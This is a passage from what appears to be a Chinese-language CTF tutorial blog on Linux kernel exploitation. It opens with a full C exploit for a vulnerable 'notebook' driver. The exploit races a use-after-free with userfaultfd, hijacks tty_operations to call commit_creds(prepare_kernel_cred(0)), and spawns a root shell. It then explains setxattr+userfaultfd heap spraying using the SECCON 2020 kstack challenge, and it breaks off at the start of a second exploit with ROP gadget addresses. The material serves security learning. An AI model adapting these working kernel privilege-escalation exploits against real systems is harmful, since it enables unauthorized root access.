<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> TTY_STRUCT_SIZE = <span class="number">0x2E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> PTMX_NUM = <span class="number">100</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8225C940</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xFFFFFFFF8109EB90</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>, <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios *old);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *page;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api=UFFD_API, .features=<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">size_t</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> note_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_add</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x100</span>, &amp;(<span class="keyword">struct</span> Note) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_del</span><span class="params">(<span class="type">size_t</span> index)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x200</span>, &amp;(<span class="keyword">struct</span> Note) &#123;.index=index&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_edit</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x300</span>, &amp;(<span class="keyword">struct</span> Note) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_gift</span><span class="params">(<span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">100</span>, &amp;(<span class="keyword">struct</span> Note) &#123;.buf=buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">note_read</span><span class="params">(<span class="type">int</span> index, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> read(note_fd, buf, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">note_write</span><span class="params">(<span class="type">int</span> index, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> write(note_fd, buf, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ptmx_fd[PTMX_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; i++) &#123;</span><br><span class="line">            ptmx_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        &#125;</span><br><span class="line">        note_edit(<span class="number">0</span>, <span class="number">1024</span>, page);</span><br><span class="line">        note_read(<span class="number">0</span>, page);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak tty_struct&quot;</span>, page, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> offset = page[<span class="number">3</span>] - <span class="number">0xffffffff81e8e440</span>;</span><br><span class="line">        commit_creds += offset;</span><br><span class="line">        prepare_kernel_cred += offset;</span><br><span class="line">        init_cred += offset;</span><br><span class="line">        work_for_cpu_fn += offset;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">tty_ops</span>;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(tty_ops) / <span class="keyword">sizeof</span>(<span class="type">size_t</span>); i++) &#123;</span><br><span class="line">            ((<span class="type">size_t</span> *) &amp;tty_ops)[i] = work_for_cpu_fn;</span><br><span class="line">        &#125;</span><br><span class="line">        note_add(<span class="number">1</span>, <span class="number">0x50</span>, page);</span><br><span class="line">        note_edit(<span class="number">1</span>, <span class="keyword">sizeof</span>(tty_ops), page);</span><br><span class="line">        note_write(<span class="number">1</span>, &amp;tty_ops);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> notebook[<span class="number">32</span>];</span><br><span class="line">        note_gift(notebook);</span><br><span class="line">        qword_dump(<span class="string">&quot;notebook&quot;</span>, notebook, <span class="number">32</span> * <span class="number">8</span>);</span><br><span class="line">        <span class="type">size_t</span> tty_ops_addr = notebook[<span class="number">2</span>];</span><br><span class="line">        <span class="type">size_t</span> tty_struct_addr = notebook[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tty_ops addr: %p\n&quot;</span>, tty_ops_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tty_struct addr: %p\n&quot;</span>, tty_struct_addr);</span><br><span class="line"></span><br><span class="line">        page[<span class="number">4</span>] = prepare_kernel_cred;</span><br><span class="line">        page[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        page[<span class="number">3</span>] = tty_ops_addr;</span><br><span class="line">        note_write(<span class="number">0</span>, page);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; i++) &#123;</span><br><span class="line">            ioctl(ptmx_fd[i], <span class="number">0x1145141919810</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        note_read(<span class="number">0</span>, page);</span><br><span class="line">        page[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        page[<span class="number">5</span>] = page[<span class="number">6</span>];</span><br><span class="line">        note_write(<span class="number">0</span>, page);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; i++) &#123;</span><br><span class="line">            ioctl(ptmx_fd[i], <span class="number">0x1145141919810</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        page[4] = commit_creds;</span></span><br><span class="line"><span class="comment">//        page[5] = init_cred;</span></span><br><span class="line"><span class="comment">//        page[3] = tty_ops_addr;</span></span><br><span class="line"><span class="comment">//        note_write(0, page);</span></span><br><span class="line"><span class="comment">//        for (int i = 0; i &lt; PTMX_NUM; i++) &#123;</span></span><br><span class="line"><span class="comment">//            ioctl(ptmx_fd[i], 0x1145141919810);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    page_size = getpagesize();</span><br><span class="line">    page = (<span class="type">size_t</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, page_size);</span><br><span class="line"></span><br><span class="line">    note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (note_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open notebook.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    note_add(<span class="number">0</span>, <span class="number">0x50</span>, page);</span><br><span class="line">    note_edit(<span class="number">0</span>, TTY_STRUCT_SIZE, page);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(buf, page_size, (<span class="type">void</span> *) uaf_thread);</span><br><span class="line">    note_edit(<span class="number">0</span>, <span class="number">0x2000</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="setxattr-userfaultfd-堆占位技术">setxattr + userfaultfd
堆占位技术</h2>
<p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用
userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用
setxattr 进行跨页面的拷贝，当 <code>copy_from_user</code>
拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr
的执行流程卡在此处，这样这个 object
就不会被释放掉，而是可以继续参与我们接下来的利用。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a6351535384c5b19afabb52078fdf5cf.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="例题seccon-2020-kstack">例题：SECCON 2020 kstack</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/seccon2020_kstack" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
驱动维护一个内存块构成的链表。 内存块大小为 32 字节。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">element = (_Element *)kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL)</span><br></pre></td></tr></table></figure></div>
链表结构如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/22c4731efa51793d7423e0e51792238a.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>主要有 add 和 del 两个功能。 这里注意到 add
功能是先将申请的内存块添加到链表中，然后再 <code>copy_from_user</code>
写入内容；而 del 功能是先找到要删除的内存块 <code>copy_to_user</code>
将内容复制出来再将其从链表中取出并释放掉。 也就是说当无论是
<code>copy_from_user</code> 还是 <code>copy_to_user</code>
，要操作的内存块依旧在链表中，此时借助 userfaultfd 可以再次对其进行 del
操作从而构造出 uaf 和 double free 。 因此漏洞利用思路如下：</p>
<ul>
<li>泄露内核地址 首先申请一个 seq_operations 并将其释放，然后 add
将这个释放的 seq_operations 申请出来，在 <code>copy_from_user</code>
处通过 userfaultfd 利用 del 删掉加入链表中的内存块其中 del 的
<code>copy_to_user</code> 泄露出内核地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d45e0b379f74fa4ee49142069cd4cb68.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>构造 double free add 一个内存块然后将其 del ，在
<code>copy_to_user</code> 处通过 userfaultfd 利用 del
将其释放，userfaultfd 完成缺页处理后再次释放造成 double free 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ed2824f7f1c85a5d5582ff748b1d0f60.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>setxattr + userfaultfd 堆占位提权 构造 double free 之后先是申请
seq_operations ，之后再 setxattr 申请同一个内存块。利用 userfaultfd 编辑
seq_operations 修改 start 函数指针为指向 <code>add rsp val;</code>
gadget 将栈迁移到 pt_regs 结构体上提前布置好的 ROP 上完成提权。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/76d1cb6c0a5ed0de01efd77f3554e475.png"
                     
alt="在这里插入图片描述" 
                ></li>
</ul>
<p>这里需要注意的一点是，前面 double free 的内存块申请出来后，freelist
已经被破坏，直接获取 shell 会造成 kernel panic
，因此需要先释放之前申请的一些内存块来供后面的使用。 另外 userfaultf
处理完缺页错误之后最好 return
结束循环处理，不然会出现一些奇怪的问题，比如泄露内核地址没及时 return
会造成 double free 的内存块再第二次申请时申请不出来。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff81069e00</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff81069c10</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81034505</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8102d5ce</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span>;</span><br><span class="line"></span><br><span class="line"><span 